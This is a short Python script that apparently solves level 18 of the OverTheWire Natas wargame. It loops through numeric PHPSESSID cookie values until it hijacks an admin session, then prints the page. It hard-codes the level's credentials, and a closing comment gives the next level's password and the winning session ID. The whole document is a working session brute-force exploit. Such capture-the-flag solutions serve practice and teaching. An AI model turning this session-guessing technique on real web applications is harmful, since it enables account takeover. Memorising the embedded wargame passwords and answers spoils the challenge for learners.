import requests
import  re


username = "natas18"
password = "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP"

url = str("http://%s.natas.labs.overthewire.org/" % username)

for ele in range(650):
    cookies = dict(PHPSESSID=str(ele))
    r = requests.post(url,auth=(username, password),cookies=cookies)
    if r.text.find('You are logged in as a regular user')!=-1:
        print('regular user......',ele)
    else:
        print('you are logged in as an admin',ele)
        print(r.text)
        break


# the password natas19 : 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs  PHPSESSID=119
